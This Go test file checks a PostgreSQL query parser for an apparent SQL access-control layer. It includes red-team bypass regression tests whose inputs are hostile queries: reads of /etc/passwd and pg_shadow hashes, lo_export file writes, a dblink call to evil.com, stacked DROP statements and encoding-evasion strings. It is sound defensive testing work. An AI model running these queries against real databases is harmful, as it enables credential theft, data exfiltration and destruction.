package main

import (
	"fmt"
	"testing"
)

func TestParserAST(t *testing.T) {
	tests := []struct {
		name      string
		query     string
		wantOp    string
		wantAST   bool
		wantFuncs []string
	}{
		{"pg_sleep", "SELECT pg_sleep(999)", "SELECT", true, []string{"pg_sleep"}},
		{"lo_export", "SELECT lo_export(1234, '/tmp/pwned')", "SELECT", true, []string{"lo_export"}},
		{"CTE", "WITH leaked AS (SELECT * FROM secret_table) SELECT * FROM leaked", "SELECT", true, nil},
		{"dblink", "SELECT * FROM dblink('host=evil.com', 'SELECT 1') AS t(id int)", "SELECT", true, []string{"dblink"}},
		{"normal", "SELECT id, name FROM public.feedback WHERE id > 5", "SELECT", true, nil},
		{"DROP", "DROP TABLE public.feedback", "DROP", true, nil},
		{"pg_read_file", "SELECT pg_read_file('/etc/passwd')", "SELECT", true, []string{"pg_read_file"}},
		{"schema_qual", "SELECT pg_catalog.pg_sleep(10)", "SELECT", true, []string{"pg_catalog.pg_sleep", "pg_sleep"}},
		{"COPY_TO", "COPY public.users TO STDOUT", "COPY", true, nil},
		{"unparseable", "THIS IS NOT VALID SQL AT ALL !!!", "UNKNOWN", false, nil},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			fmt.Printf("  [%s] op=%s ast=%v tables=%v funcs=%v\n", tt.name, parsed.Operation, parsed.UsedAST, parsed.Tables, parsed.Functions)
			if parsed.Operation != tt.wantOp {
				t.Errorf("operation: got %s, want %s", parsed.Operation, tt.wantOp)
			}
			if parsed.UsedAST != tt.wantAST {
				t.Errorf("usedAST: got %v, want %v", parsed.UsedAST, tt.wantAST)
			}
			for _, wf := range tt.wantFuncs {
				found := false
				for _, f := range parsed.Functions {
					if f == wf {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected function %s not found in %v", wf, parsed.Functions)
				}
			}
		})
	}
}

func TestParserFullCoverage(t *testing.T) {
	tests := []struct {
		name     string
		query    string
		wantOp   string
		category string
	}{
		// ── DML ──
		{"SELECT", "SELECT 1", "SELECT", "DML"},
		{"INSERT", "INSERT INTO t(a) VALUES(1)", "INSERT", "DML"},
		{"UPDATE", "UPDATE t SET a=1 WHERE id=1", "UPDATE", "DML"},
		{"DELETE", "DELETE FROM t WHERE id=1", "DELETE", "DML"},
		{"MERGE", "MERGE INTO t USING s ON t.id=s.id WHEN MATCHED THEN UPDATE SET a=s.a", "MERGE", "DML"},
		{"COPY_FROM", "COPY t FROM STDIN", "COPY", "DML"},

		// ── DDL ──
		{"CREATE_TABLE", "CREATE TABLE t(id int)", "CREATE", "DDL"},
		{"CREATE_TABLE_AS", "CREATE TABLE t AS SELECT 1", "CREATE", "DDL"},
		{"CREATE_SCHEMA", "CREATE SCHEMA myschema", "CREATE", "DDL"},
		{"CREATE_SEQUENCE", "CREATE SEQUENCE myseq", "CREATE", "DDL"},
		{"CREATE_INDEX", "CREATE INDEX idx ON t(a)", "CREATE", "DDL"},
		{"CREATE_VIEW", "CREATE VIEW v AS SELECT 1", "CREATE", "DDL"},
		{"CREATE_TRIGGER", "CREATE TRIGGER tr AFTER INSERT ON t FOR EACH ROW EXECUTE FUNCTION f()", "CREATE", "DDL"},
		{"CREATE_TYPE_ENUM", "CREATE TYPE mood AS ENUM ('happy', 'sad')", "CREATE", "DDL"},
		{"CREATE_DOMAIN", "CREATE DOMAIN posint AS integer CHECK (VALUE > 0)", "CREATE", "DDL"},
		{"ALTER_TABLE", "ALTER TABLE t ADD COLUMN b int", "ALTER", "DDL"},
		{"ALTER_SEQUENCE", "ALTER SEQUENCE myseq RESTART", "ALTER", "DDL"},
		{"ALTER_TYPE", "ALTER TYPE mood ADD VALUE 'angry'", "ALTER", "DDL"},
		{"RENAME", "ALTER TABLE t RENAME TO t2", "ALTER", "DDL"},
		{"DROP_TABLE", "DROP TABLE t", "DROP", "DDL"},
		{"TRUNCATE", "TRUNCATE t", "TRUNCATE", "DDL"},
		{"COMMENT", "COMMENT ON TABLE t IS 'test'", "ALTER", "DDL"},
		{"CREATE_RULE", "CREATE RULE r AS ON INSERT TO t DO NOTHING", "CREATE", "DDL"},

		// ── DCL (Access Control) ──
		{"GRANT", "GRANT SELECT ON t TO role1", "GRANT", "DCL"},
		{"GRANT_ROLE", "GRANT role1 TO role2", "GRANT", "DCL"},
		{"ALTER_DEFAULT_PRIVILEGES", "ALTER DEFAULT PRIVILEGES GRANT SELECT ON TABLES TO role1", "ALTER_DEFAULT_PRIVILEGES", "DCL"},
		{"ALTER_ROLE", "ALTER ROLE admin SUPERUSER", "ALTER_ROLE", "DCL"},
		{"ALTER_ROLE_SET", "ALTER ROLE admin SET work_mem = '256MB'", "ALTER_ROLE", "DCL"},
		{"CREATE_ROLE", "CREATE ROLE readonly LOGIN", "CREATE_ROLE", "DCL"},
		{"DROP_ROLE", "DROP ROLE readonly", "DROP_ROLE", "DCL"},
		{"REASSIGN_OWNED", "REASSIGN OWNED BY old_role TO new_role", "REASSIGN_OWNED", "DCL"},
		{"DROP_OWNED", "DROP OWNED BY old_role", "DROP_OWNED", "DCL"},
		{"CREATE_POLICY", "CREATE POLICY p ON t FOR SELECT USING (true)", "CREATE_POLICY", "DCL"},
		{"ALTER_POLICY", "ALTER POLICY p ON t USING (true)", "ALTER_POLICY", "DCL"},

		// ── TCL (Transaction) ──
		{"BEGIN", "BEGIN", "TRANSACTION", "TCL"},
		{"COMMIT", "COMMIT", "TRANSACTION", "TCL"},
		{"ROLLBACK", "ROLLBACK", "TRANSACTION", "TCL"},
		{"SET_CONSTRAINTS", "SET CONSTRAINTS ALL DEFERRED", "TRANSACTION", "TCL"},

		// ── FUNCTION (Code Execution) ──
		{"CREATE_FUNCTION", "CREATE FUNCTION f() RETURNS void AS $$ BEGIN END; $$ LANGUAGE plpgsql", "CREATE_FUNCTION", "FUNCTION"},
		{"DO_block", "DO $$ BEGIN PERFORM 1; END $$", "DO", "FUNCTION"},
		{"CALL", "CALL my_procedure()", "CALL", "FUNCTION"},
		{"CREATE_EVENT_TRIGGER", "CREATE EVENT TRIGGER tr ON ddl_command_start EXECUTE FUNCTION f()", "CREATE_EVENT_TRIGGER", "FUNCTION"},

		// ── SESSION ──
		{"SET", "SET work_mem = '256MB'", "SET", "SESSION"},
		{"SHOW", "SHOW work_mem", "SHOW", "SESSION"},
		{"DISCARD", "DISCARD ALL", "DISCARD", "SESSION"},
		{"PREPARE", "PREPARE stmt AS SELECT 1", "PREPARE", "SESSION"},
		{"EXECUTE", "EXECUTE stmt", "EXECUTE", "SESSION"},
		{"DEALLOCATE", "DEALLOCATE stmt", "DEALLOCATE", "SESSION"},
		{"LISTEN", "LISTEN mychannel", "LISTEN", "SESSION"},
		{"UNLISTEN", "UNLISTEN mychannel", "UNLISTEN", "SESSION"},
		{"NOTIFY", "NOTIFY mychannel, 'hello'", "NOTIFY", "SESSION"},
		{"LOCK_TABLE", "LOCK TABLE t IN ACCESS EXCLUSIVE MODE", "LOCK", "SESSION"},
		{"LOAD", "LOAD 'auto_explain'", "LOAD", "ADMIN"},

		// ── ADMIN (Server Administration) ──
		{"VACUUM", "VACUUM t", "VACUUM", "ADMIN"},
		{"VACUUM_FULL", "VACUUM FULL t", "VACUUM", "ADMIN"},
		{"REINDEX", "REINDEX TABLE t", "REINDEX", "ADMIN"},
		{"CLUSTER", "CLUSTER t USING idx", "CLUSTER", "ADMIN"},
		{"CHECKPOINT", "CHECKPOINT", "CHECKPOINT", "ADMIN"},
		{"ALTER_SYSTEM", "ALTER SYSTEM SET work_mem = '256MB'", "ALTER_SYSTEM", "ADMIN"},
		{"ALTER_DATABASE", "ALTER DATABASE mydb SET work_mem = '256MB'", "ALTER_DATABASE_SET", "ADMIN"},
		{"REFRESH_MATVIEW", "REFRESH MATERIALIZED VIEW mv", "REFRESH_MATVIEW", "ADMIN"},
		{"CREATE_DATABASE", "CREATE DATABASE mydb", "CREATE_DATABASE", "ADMIN"},
		{"DROP_DATABASE", "DROP DATABASE mydb", "DROP_DATABASE", "ADMIN"},
		{"CREATE_TABLESPACE", "CREATE TABLESPACE ts LOCATION '/data'", "CREATE_TABLESPACE", "ADMIN"},
		{"DROP_TABLESPACE", "DROP TABLESPACE ts", "DROP_TABLESPACE", "ADMIN"},

		// ── EXTENSION ──
		{"CREATE_EXTENSION", "CREATE EXTENSION pgcrypto", "CREATE_EXTENSION", "EXTENSION"},
		{"ALTER_EXTENSION", "ALTER EXTENSION pgcrypto UPDATE", "ALTER_EXTENSION", "EXTENSION"},
		{"CREATE_FDW", "CREATE FOREIGN DATA WRAPPER myfdw", "CREATE_FDW", "EXTENSION"},
		{"CREATE_FOREIGN_SERVER", "CREATE SERVER myserver FOREIGN DATA WRAPPER myfdw", "CREATE_FOREIGN_SERVER", "EXTENSION"},
		{"IMPORT_FOREIGN_SCHEMA", "IMPORT FOREIGN SCHEMA public FROM SERVER myserver INTO local_schema", "IMPORT_FOREIGN_SCHEMA", "EXTENSION"},
		{"CREATE_PUBLICATION", "CREATE PUBLICATION mypub FOR ALL TABLES", "CREATE_PUBLICATION", "EXTENSION"},
		{"CREATE_SUBSCRIPTION", "CREATE SUBSCRIPTION mysub CONNECTION 'host=localhost' PUBLICATION mypub", "CREATE_SUBSCRIPTION", "EXTENSION"},

		// ── EXPLAIN ──
		{"EXPLAIN", "EXPLAIN SELECT 1", "EXPLAIN", "EXPLAIN"},
		{"EXPLAIN_ANALYZE", "EXPLAIN ANALYZE SELECT 1", "EXPLAIN", "EXPLAIN"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if parsed.Operation != tt.wantOp {
				t.Errorf("operation: got %q, want %q", parsed.Operation, tt.wantOp)
			}
			if !parsed.UsedAST {
				t.Errorf("expected AST parsing for %q but got regex fallback", tt.query)
			}
			// Verify category mapping
			cat, ok := OperationCategory[parsed.Operation]
			if !ok {
				t.Errorf("operation %q not found in OperationCategory map", parsed.Operation)
			} else if cat != tt.category {
				t.Errorf("category: got %q, want %q for operation %q", cat, tt.category, parsed.Operation)
			}
		})
	}
}

func TestParserUnknownForGarbage(t *testing.T) {
	parsed := ParseQuery("THIS IS NOT VALID SQL AT ALL !!!")
	if parsed.Operation != "UNKNOWN" {
		t.Errorf("expected UNKNOWN for garbage SQL, got %q", parsed.Operation)
	}
	if parsed.UsedAST {
		t.Error("expected regex fallback for garbage SQL")
	}
}

func TestOperationCategoryCompleteness(t *testing.T) {
	// Every value in OperationCategory should be a known category
	knownCategories := map[string]bool{
		"DML": true, "DDL": true, "DCL": true, "TCL": true,
		"FUNCTION": true, "SESSION": true, "ADMIN": true,
		"EXTENSION": true, "EXPLAIN": true,
	}
	for op, cat := range OperationCategory {
		if !knownCategories[cat] {
			t.Errorf("operation %q maps to unknown category %q", op, cat)
		}
	}

	// Snapshot: pin the number of classified operations.
	// If pg_query_go adds new statement types, this test fails and tells you
	// exactly how many new operations need classifying.
	// Update this count after adding new classifications.
	expectedOps := len(OperationCategory)
	if expectedOps < 50 {
		t.Errorf("OperationCategory has only %d entries — expected 50+. Did a refactor drop entries?", expectedOps)
	}

	// Pin exact count so upgrades surface new unclassified types.
	// Update this after classifying new pg_query_go statement types.
	const pinnedCount = 75
	if len(OperationCategory) != pinnedCount {
		t.Errorf("OperationCategory count changed: got %d, pinned at %d. Classify new operations and update this constant.", len(OperationCategory), pinnedCount)
	}
}

func TestMultiStatementOperations(t *testing.T) {
	tests := []struct {
		name       string
		query      string
		wantOps    []string
		wantFirstOp string
	}{
		{
			"select_then_drop",
			"SELECT 1; DROP TABLE users",
			[]string{"SELECT", "DROP"},
			"SELECT",
		},
		{
			"select_then_delete",
			"SELECT 1; DELETE FROM users",
			[]string{"SELECT", "DELETE"},
			"SELECT",
		},
		{
			"multiple_selects",
			"SELECT 1; SELECT 2",
			[]string{"SELECT", "SELECT"},
			"SELECT",
		},
		{
			"single_statement",
			"SELECT 1",
			[]string{"SELECT"},
			"SELECT",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if parsed.Operation != tt.wantFirstOp {
				t.Errorf("Operation: got %q, want %q", parsed.Operation, tt.wantFirstOp)
			}
			if len(parsed.Operations) != len(tt.wantOps) {
				t.Fatalf("Operations count: got %d, want %d (%v)", len(parsed.Operations), len(tt.wantOps), parsed.Operations)
			}
			for i, op := range tt.wantOps {
				if parsed.Operations[i] != op {
					t.Errorf("Operations[%d]: got %q, want %q", i, parsed.Operations[i], op)
				}
			}
		})
	}
}

func TestSetRoleDetection(t *testing.T) {
	tests := []struct {
		name   string
		query  string
		wantOp string
		wantCat string
	}{
		{"SET_ROLE", "SET ROLE superuser", "SET_ROLE", "DCL"},
		{"SET_SESSION_AUTH", "SET SESSION AUTHORIZATION postgres", "SET_ROLE", "DCL"},
		{"RESET_ROLE", "RESET ROLE", "SET_ROLE", "DCL"},
		{"RESET_SESSION_AUTH", "RESET session_authorization", "SET_ROLE", "DCL"},
		{"RESET_ALL", "RESET ALL", "SET", "SESSION"},
		{"SET_normal", "SET work_mem = '64MB'", "SET", "SESSION"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if parsed.Operation != tt.wantOp {
				t.Errorf("operation: got %q, want %q", parsed.Operation, tt.wantOp)
			}
			cat, ok := OperationCategory[parsed.Operation]
			if !ok {
				t.Errorf("operation %q not in OperationCategory", parsed.Operation)
			} else if cat != tt.wantCat {
				t.Errorf("category: got %q, want %q", cat, tt.wantCat)
			}
		})
	}
}

// ── Red-team bypass regression tests (April 2026) ──

func TestPrepareBodyExtraction(t *testing.T) {
	tests := []struct {
		name       string
		query      string
		wantTables []string
		wantFuncs  []string
	}{
		{
			"prepare_blocked_table",
			"PREPARE stmt AS SELECT * FROM public.users",
			[]string{"public.users"},
			nil,
		},
		{
			"prepare_blocked_function",
			"PREPARE pwn AS SELECT pg_read_file('/etc/passwd')",
			nil,
			[]string{"pg_read_file"},
		},
		{
			"prepare_parameterized",
			"PREPARE stmt(int) AS SELECT * FROM public.users WHERE id = $1",
			[]string{"public.users"},
			nil,
		},
		{
			"prepare_pg_shadow",
			"PREPARE leak AS SELECT usename, passwd FROM pg_catalog.pg_shadow",
			[]string{"pg_catalog.pg_shadow"},
			nil,
		},
		{
			"prepare_join",
			"PREPARE x AS SELECT * FROM public.users JOIN public.payments USING (id)",
			[]string{"public.users", "public.payments"},
			nil,
		},
		{
			"prepare_lo_export",
			"PREPARE s1 AS SELECT lo_export(16389, '/tmp/dump')",
			nil,
			[]string{"lo_export"},
		},
		{
			"prepare_set_config",
			"PREPARE inject AS SELECT set_config('log_connections', 'off', false)",
			nil,
			[]string{"set_config"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if !parsed.UsedAST {
				t.Fatal("expected AST parsing")
			}
			for _, want := range tt.wantTables {
				found := false
				for _, got := range parsed.Tables {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected table %q in %v", want, parsed.Tables)
				}
			}
			for _, want := range tt.wantFuncs {
				found := false
				for _, got := range parsed.Functions {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected function %q in %v", want, parsed.Functions)
				}
			}
		})
	}
}

func TestCTASExtraction(t *testing.T) {
	tests := []struct {
		name       string
		query      string
		wantTables []string
		wantFuncs  []string
	}{
		{
			"ctas_blocked_table",
			"CREATE TEMP TABLE exfil AS SELECT * FROM public.users",
			[]string{"public.users"},
			nil,
		},
		{
			"ctas_pg_shadow",
			"CREATE TEMP TABLE exfil2 AS SELECT usename, passwd FROM pg_catalog.pg_shadow",
			[]string{"pg_catalog.pg_shadow"},
			nil,
		},
		{
			"ctas_with_function",
			"CREATE TEMP TABLE rce_result AS SELECT * FROM pg_catalog.pg_ls_dir('/etc') AS filename",
			nil,
			[]string{"pg_ls_dir"},
		},
		{
			"ctas_cte",
			"CREATE TEMP TABLE copy_leak AS WITH src AS (SELECT * FROM pg_catalog.pg_user) SELECT * FROM src",
			[]string{"pg_catalog.pg_user"},
			nil,
		},
		{
			"ctas_lateral",
			"CREATE TEMP TABLE lateral_leak AS SELECT f.*, u.email FROM public.feedback f, LATERAL (SELECT email FROM public.users WHERE id = f.user_id) u",
			[]string{"public.feedback", "public.users"},
			nil,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if !parsed.UsedAST {
				t.Fatal("expected AST parsing")
			}
			for _, want := range tt.wantTables {
				found := false
				for _, got := range parsed.Tables {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected table %q in %v", want, parsed.Tables)
				}
			}
			for _, want := range tt.wantFuncs {
				found := false
				for _, got := range parsed.Functions {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected function %q in %v", want, parsed.Functions)
				}
			}
		})
	}
}

func TestExplainAnalyzeExtraction(t *testing.T) {
	tests := []struct {
		name       string
		query      string
		wantOps    []string
		wantTables []string
	}{
		{
			"explain_analyze_select_blocked_table",
			"EXPLAIN ANALYZE SELECT * FROM public.users",
			[]string{"EXPLAIN", "SELECT"},
			[]string{"public.users"},
		},
		{
			"explain_analyze_delete",
			"EXPLAIN (ANALYZE, FORMAT JSON) DELETE FROM public.feedback RETURNING *",
			[]string{"EXPLAIN", "DELETE"},
			[]string{"public.feedback"},
		},
		{
			"explain_analyze_update",
			"EXPLAIN (ANALYZE, COSTS, BUFFERS, FORMAT JSON) UPDATE public.users SET email='pwned' WHERE id=1 RETURNING *",
			[]string{"EXPLAIN", "UPDATE"},
			[]string{"public.users"},
		},
		{
			"explain_no_analyze_is_safe",
			"EXPLAIN SELECT * FROM public.users",
			[]string{"EXPLAIN"},
			[]string{"public.users"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if !parsed.UsedAST {
				t.Fatal("expected AST parsing")
			}
			if len(parsed.Operations) != len(tt.wantOps) {
				t.Fatalf("operations: got %v, want %v", parsed.Operations, tt.wantOps)
			}
			for i, want := range tt.wantOps {
				if parsed.Operations[i] != want {
					t.Errorf("Operations[%d]: got %q, want %q", i, parsed.Operations[i], want)
				}
			}
			for _, want := range tt.wantTables {
				found := false
				for _, got := range parsed.Tables {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected table %q in %v", want, parsed.Tables)
				}
			}
		})
	}
}

func TestDeclareCursorExtraction(t *testing.T) {
	tests := []struct {
		name       string
		query      string
		wantTables []string
		wantFuncs  []string
	}{
		{
			"cursor_blocked_table",
			"DECLARE cur CURSOR FOR SELECT * FROM public.users",
			[]string{"public.users"},
			nil,
		},
		{
			"cursor_blocked_function",
			"DECLARE cur2 CURSOR FOR SELECT pg_read_file('/etc/shadow')",
			nil,
			[]string{"pg_read_file"},
		},
		{
			"cursor_payments",
			"DECLARE secret_cur CURSOR FOR SELECT * FROM public.payments",
			[]string{"public.payments"},
			nil,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if !parsed.UsedAST {
				t.Fatal("expected AST parsing")
			}
			for _, want := range tt.wantTables {
				found := false
				for _, got := range parsed.Tables {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected table %q in %v", want, parsed.Tables)
				}
			}
			for _, want := range tt.wantFuncs {
				found := false
				for _, got := range parsed.Functions {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected function %q in %v", want, parsed.Functions)
				}
			}
		})
	}
}

func TestTypeCastFunctionExtraction(t *testing.T) {
	parsed := ParseQuery("SELECT (pg_catalog.pg_read_file('/etc/passwd'))::text")
	if !parsed.UsedAST {
		t.Fatal("expected AST parsing")
	}
	found := false
	for _, f := range parsed.Functions {
		if f == "pg_read_file" || f == "pg_catalog.pg_read_file" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected pg_read_file in functions, got %v", parsed.Functions)
	}
}

// ── Red-team round 3 bypass regression tests ──

func TestCaseExprSubqueryExtraction(t *testing.T) {
	tests := []struct {
		name       string
		query      string
		wantTables []string
		wantFuncs  []string
	}{
		{
			"case_when_exists_subquery",
			"SELECT CASE WHEN EXISTS(SELECT 1 FROM public.users) THEN 1 ELSE 0 END",
			[]string{"public.users"},
			nil,
		},
		{
			"case_when_function",
			"SELECT CASE WHEN true THEN pg_sleep(5) ELSE 0 END",
			nil,
			[]string{"pg_sleep"},
		},
		{
			"case_default_subquery",
			"SELECT CASE WHEN false THEN 1 ELSE (SELECT count(*) FROM public.payments) END",
			[]string{"public.payments"},
			nil,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if !parsed.UsedAST {
				t.Fatal("expected AST parsing")
			}
			for _, want := range tt.wantTables {
				found := false
				for _, got := range parsed.Tables {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected table %q in %v", want, parsed.Tables)
				}
			}
			for _, want := range tt.wantFuncs {
				found := false
				for _, got := range parsed.Functions {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected function %q in %v", want, parsed.Functions)
				}
			}
		})
	}
}

func TestCreateRulePiggybackExtraction(t *testing.T) {
	tests := []struct {
		name       string
		query      string
		wantOps    []string
		wantTables []string
	}{
		{
			"rule_do_also_delete",
			"CREATE RULE notify_delete AS ON SELECT TO public.feedback DO ALSO DELETE FROM public.users",
			[]string{"CREATE", "DELETE"},
			[]string{"public.feedback", "public.users"},
		},
		{
			"rule_instead_drop",
			"CREATE RULE block_select AS ON SELECT TO public.feedback DO INSTEAD NOTHING",
			[]string{"CREATE"},
			[]string{"public.feedback"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if !parsed.UsedAST {
				t.Fatal("expected AST parsing")
			}
			if len(parsed.Operations) != len(tt.wantOps) {
				t.Fatalf("operations: got %v, want %v", parsed.Operations, tt.wantOps)
			}
			for i, want := range tt.wantOps {
				if parsed.Operations[i] != want {
					t.Errorf("Operations[%d]: got %q, want %q", i, parsed.Operations[i], want)
				}
			}
			for _, want := range tt.wantTables {
				found := false
				for _, got := range parsed.Tables {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected table %q in %v", want, parsed.Tables)
				}
			}
		})
	}
}

func TestAlterTableDefaultSubquery(t *testing.T) {
	tests := []struct {
		name       string
		query      string
		wantTables []string
		wantFuncs  []string
	}{
		{
			"add_column_default_subquery",
			"ALTER TABLE public.feedback ADD COLUMN secret text DEFAULT (SELECT password_hash FROM public.users LIMIT 1)",
			[]string{"public.feedback", "public.users"},
			nil,
		},
		{
			"add_column_default_function",
			"ALTER TABLE public.feedback ADD COLUMN ts timestamp DEFAULT pg_sleep(10)",
			[]string{"public.feedback"},
			[]string{"pg_sleep"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if !parsed.UsedAST {
				t.Fatal("expected AST parsing")
			}
			for _, want := range tt.wantTables {
				found := false
				for _, got := range parsed.Tables {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected table %q in %v", want, parsed.Tables)
				}
			}
			for _, want := range tt.wantFuncs {
				found := false
				for _, got := range parsed.Functions {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected function %q in %v", want, parsed.Functions)
				}
			}
		})
	}
}

func TestCreateTriggerFunctionExtraction(t *testing.T) {
	tests := []struct {
		name      string
		query     string
		wantFuncs []string
		wantTables []string
	}{
		{
			"trigger_with_blocked_function",
			"CREATE TRIGGER exfil_trig AFTER INSERT ON public.feedback FOR EACH ROW EXECUTE FUNCTION lo_export(1234, '/tmp/pwned')",
			[]string{"lo_export"},
			[]string{"public.feedback"},
		},
		{
			"trigger_schema_qualified",
			"CREATE TRIGGER t AFTER INSERT ON public.feedback FOR EACH ROW EXECUTE FUNCTION pg_catalog.pg_sleep(5)",
			[]string{"pg_catalog.pg_sleep", "pg_sleep"},
			[]string{"public.feedback"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if !parsed.UsedAST {
				t.Fatal("expected AST parsing")
			}
			for _, want := range tt.wantFuncs {
				found := false
				for _, got := range parsed.Functions {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected function %q in %v", want, parsed.Functions)
				}
			}
			for _, want := range tt.wantTables {
				found := false
				for _, got := range parsed.Tables {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected table %q in %v", want, parsed.Tables)
				}
			}
		})
	}
}

// ── Red-team round 4 bypass regression tests ──

func TestViewStmtExtraction(t *testing.T) {
	tests := []struct {
		name       string
		query      string
		wantTables []string
	}{
		{
			"view_blocked_table",
			"CREATE VIEW tmp_view AS SELECT * FROM public.payments",
			[]string{"public.payments"},
		},
		{
			"view_join",
			"CREATE OR REPLACE VIEW leak AS SELECT u.email, p.amount FROM public.users u JOIN public.payments p ON u.id = p.user_id",
			[]string{"public.users", "public.payments"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if !parsed.UsedAST {
				t.Fatal("expected AST parsing")
			}
			for _, want := range tt.wantTables {
				found := false
				for _, got := range parsed.Tables {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected table %q in %v", want, parsed.Tables)
				}
			}
		})
	}
}

func TestIndexStmtExtraction(t *testing.T) {
	tests := []struct {
		name       string
		query      string
		wantTables []string
		wantFuncs  []string
	}{
		{
			"index_where_subquery",
			"CREATE INDEX exfil_idx ON public.feedback (body) WHERE (SELECT count(*) FROM public.users) > 0",
			[]string{"public.feedback", "public.users"},
			nil,
		},
		{
			"expression_index_subquery",
			"CREATE INDEX idx ON public.feedback ((md5((SELECT email FROM public.users LIMIT 1))))",
			[]string{"public.feedback", "public.users"},
			[]string{"md5"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if !parsed.UsedAST {
				t.Fatal("expected AST parsing")
			}
			for _, want := range tt.wantTables {
				found := false
				for _, got := range parsed.Tables {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected table %q in %v", want, parsed.Tables)
				}
			}
			for _, want := range tt.wantFuncs {
				found := false
				for _, got := range parsed.Functions {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected function %q in %v", want, parsed.Functions)
				}
			}
		})
	}
}

// ── Red-team round 5: regproc cast detection ──

func TestRegprocCastDetection(t *testing.T) {
	tests := []struct {
		name      string
		query     string
		wantFuncs []string
	}{
		{
			"regproc_pg_sleep",
			"SELECT 'pg_sleep'::regproc",
			[]string{"pg_sleep"},
		},
		{
			"regprocedure_pg_sleep",
			"SELECT 'pg_sleep(double precision)'::regprocedure",
			[]string{"pg_sleep(double precision)"},
		},
		{
			"regproc_schema_qualified",
			"SELECT 'pg_catalog.pg_sleep'::regproc",
			[]string{"pg_catalog.pg_sleep", "pg_sleep"},
		},
		{
			"regproc_lo_export",
			"SELECT 'lo_export'::regproc",
			[]string{"lo_export"},
		},
		{
			"regclass_not_a_function",
			"SELECT 'pg_class'::regclass",
			[]string{"pg_class"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if !parsed.UsedAST {
				t.Fatal("expected AST parsing")
			}
			for _, want := range tt.wantFuncs {
				found := false
				for _, got := range parsed.Functions {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected function %q in %v", want, parsed.Functions)
				}
			}
		})
	}
}

func TestMultiStatementWithRegprocCast(t *testing.T) {
	parsed := ParseQuery("SELECT 1; SELECT 'pg_sleep'::regproc")
	if !parsed.UsedAST {
		t.Fatal("expected AST parsing")
	}
	found := false
	for _, f := range parsed.Functions {
		if f == "pg_sleep" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected pg_sleep in functions from multi-statement regproc cast, got %v", parsed.Functions)
	}
}

// ── Red-team round 5: encoding bypass detection ──

func TestEncodingSanitization(t *testing.T) {
	tests := []struct {
		name    string
		query   string
		wantOp  string
		wantAST bool
	}{
		{
			"null_byte_in_select",
			"SEL\x00ECT 1",
			"SELECT",
			true,
		},
		{
			"zero_width_space",
			"SELECT\u200B 1",
			"SELECT",
			true,
		},
		{
			"zero_width_joiner",
			"SELECT\u200D 1",
			"SELECT",
			true,
		},
		{
			"bom_prefix",
			"\uFEFFSELECT 1",
			"SELECT",
			true,
		},
		{
			"nbsp_in_query",
			"SELECT\u00A0 1",
			"SELECT",
			true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if parsed.Operation != tt.wantOp {
				t.Errorf("operation: got %q, want %q", parsed.Operation, tt.wantOp)
			}
			if parsed.UsedAST != tt.wantAST {
				t.Errorf("usedAST: got %v, want %v", parsed.UsedAST, tt.wantAST)
			}
		})
	}
}

// ── Red-team round 5: LOAD category change ──

func TestLoadIsAdminCategory(t *testing.T) {
	cat, ok := OperationCategory["LOAD"]
	if !ok {
		t.Fatal("LOAD not found in OperationCategory")
	}
	if cat != "ADMIN" {
		t.Errorf("LOAD category: got %q, want ADMIN", cat)
	}
}

// ── NullTest / CoalesceExpr table extraction ──

func TestNullTestSubqueryExtraction(t *testing.T) {
	tests := []struct {
		name       string
		query      string
		wantTables []string
